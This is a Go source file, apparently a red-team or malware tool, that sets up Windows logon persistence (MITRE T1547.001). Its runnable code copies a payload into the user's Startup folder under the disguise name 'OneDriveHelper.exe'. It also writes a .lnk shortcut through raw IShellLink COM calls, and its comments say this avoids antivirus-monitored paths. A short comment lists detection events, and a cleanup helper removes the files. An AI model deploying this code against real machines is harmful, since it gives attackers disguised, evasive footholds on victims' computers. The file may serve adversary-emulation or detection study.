// +build windows

// Startup Folder Persistence - MITRE ATT&CK T1547.001
//
// Copies the payload into the current user's Startup folder so Windows
// Explorer auto-launches it on logon.  No admin, no registry writes.
//
// Two approaches:
//   1. Direct copy  - drop the executable into the Startup folder.
//   2. LNK shortcut - write a .lnk file pointing at a payload elsewhere on
//                     disk.  This keeps the real binary out of the obvious
//                     Startup path, which some AV vendors monitor.
//
// Paths:
//   User startup:   %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
//   All-users:      %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
//                   (requires admin)
//
// Detection: Sysmon Event ID 11 (file create) in the Startup directory,
// autoruns, Windows Security Event ID 4688 (new process from startup).

package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

const startupBinaryName = "OneDriveHelper.exe" // blend-in name

// userStartupDir returns the current user's Startup folder path.
func userStartupDir() (string, error) {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return "", fmt.Errorf("%%APPDATA%% not set")
	}
	return filepath.Join(appdata, `Microsoft\Windows\Start Menu\Programs\Startup`), nil
}

// CopyToStartup copies srcPath into the user's Startup folder.
func CopyToStartup(srcPath string) error {
	dir, err := userStartupDir()
	if err != nil {
		return err
	}

	dst := filepath.Join(dir, startupBinaryName)

	src, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("open source: %w", err)
	}
	defer src.Close()

	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("create dst: %w", err)
	}
	defer out.Close()

	if _, err := io.Copy(out, src); err != nil {
		return fmt.Errorf("copy: %w", err)
	}

	fmt.Printf("[+] Payload copied to startup: %s\n", dst)
	return nil
}

// --- LNK shortcut creation via IShellLink COM ---
//
// Windows .lnk files are COM objects.  Go has no native LNK library, so we
// call the Shell COM interfaces directly through syscall.  This is the same
// pattern real-world malware uses to avoid writing a PE to the Startup folder.

var (
	ole32                = syscall.NewLazyDLL("ole32.dll")
	procCoInitialize     = ole32.NewProc("CoInitialize")
	procCoCreateInstance = ole32.NewProc("CoCreateInstance")
	procCoUninitialize   = ole32.NewProc("CoUninitialize")
)

// COM GUIDs for IShellLink and IPersistFile
var (
	CLSID_ShellLink = syscall.GUID{
		Data1: 0x00021401, Data2: 0x0000, Data3: 0x0000,
		Data4: [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46},
	}
	IID_IShellLinkW = syscall.GUID{
		Data1: 0x000214F9, Data2: 0x0000, Data3: 0x0000,
		Data4: [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46},
	}
	IID_IPersistFile = syscall.GUID{
		Data1: 0x0000010B, Data2: 0x0000, Data3: 0x0000,
		Data4: [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46},
	}
)

// IShellLinkW vtable layout (partial — only offsets we use).
// SetPath is at vtable index 20, QueryInterface at 0.
type iShellLinkWVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	_              [17]uintptr // GetPath, GetIDList, SetIDList, GetDescription, SetDescription,
	//                            GetWorkingDirectory, SetWorkingDirectory, GetArguments,
	//                            SetArguments, GetHotkey, SetHotkey, GetShowCmd, SetShowCmd,
	//                            GetIconLocation, SetIconLocation, SetRelativePath, Resolve
	SetPath uintptr // index 20
}

type iShellLinkW struct{ vtbl *iShellLinkWVtbl }

// IPersistFile vtable layout (partial).
type iPersistFileVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	_              [2]uintptr // GetClassID, IsDirty
	Load           uintptr
	Save           uintptr
}

type iPersistFile struct{ vtbl *iPersistFileVtbl }

// CreateStartupLNK writes a .lnk shortcut in the Startup folder pointing at targetPath.
func CreateStartupLNK(targetPath string) error {
	dir, err := userStartupDir()
	if err != nil {
		return err
	}
	lnkPath := filepath.Join(dir, "OneDriveHelper.lnk")

	procCoInitialize.Call(0)
	defer procCoUninitialize.Call()

	var shellLink *iShellLinkW
	hr, _, _ := procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&CLSID_ShellLink)),
		0,
		1, // CLSCTX_INPROC_SERVER
		uintptr(unsafe.Pointer(&IID_IShellLinkW)),
		uintptr(unsafe.Pointer(&shellLink)),
	)
	if hr != 0 {
		return fmt.Errorf("CoCreateInstance IShellLinkW: 0x%x", hr)
	}
	defer syscall.SyscallN(
		shellLink.vtbl.Release,
		uintptr(unsafe.Pointer(shellLink)),
	)

	// SetPath on the IShellLinkW interface.
	targetUTF16, _ := syscall.UTF16PtrFromString(targetPath)
	hr, _, _ = syscall.SyscallN(
		shellLink.vtbl.SetPath,
		uintptr(unsafe.Pointer(shellLink)),
		uintptr(unsafe.Pointer(targetUTF16)),
	)
	if hr != 0 {
		return fmt.Errorf("IShellLinkW::SetPath: 0x%x", hr)
	}

	// QueryInterface for IPersistFile to save the .lnk.
	var persistFile *iPersistFile
	hr, _, _ = syscall.SyscallN(
		shellLink.vtbl.QueryInterface,
		uintptr(unsafe.Pointer(shellLink)),
		uintptr(unsafe.Pointer(&IID_IPersistFile)),
		uintptr(unsafe.Pointer(&persistFile)),
	)
	if hr != 0 {
		return fmt.Errorf("QI IPersistFile: 0x%x", hr)
	}
	defer syscall.SyscallN(
		persistFile.vtbl.Release,
		uintptr(unsafe.Pointer(persistFile)),
	)

	lnkUTF16, _ := syscall.UTF16PtrFromString(lnkPath)
	hr, _, _ = syscall.SyscallN(
		persistFile.vtbl.Save,
		uintptr(unsafe.Pointer(persistFile)),
		uintptr(unsafe.Pointer(lnkUTF16)),
		1, // fRemember = TRUE
	)
	if hr != 0 {
		return fmt.Errorf("IPersistFile::Save: 0x%x", hr)
	}

	fmt.Printf("[+] LNK shortcut written: %s -> %s\n", lnkPath, targetPath)
	return nil
}

// RemoveStartup deletes both the copied binary and the LNK (cleanup helper).
func RemoveStartup() {
	dir, _ := userStartupDir()
	for _, name := range []string{startupBinaryName, "OneDriveHelper.lnk"} {
		path := filepath.Join(dir, name)
		if err := os.Remove(path); err == nil {
			fmt.Printf("[+] Removed: %s\n", path)
		}
	}
}

func main() {
	payload := os.Args[0]
	if len(os.Args) > 1 {
		payload = os.Args[1]
	}

	// Option 1: copy executable directly into Startup folder.
	if err := CopyToStartup(payload); err != nil {
		fmt.Println("[-] Direct copy failed:", err)
	}

	// Option 2: write an LNK pointing at the original location.
	if err := CreateStartupLNK(payload); err != nil {
		fmt.Println("[-] LNK creation failed:", err)
	}
}
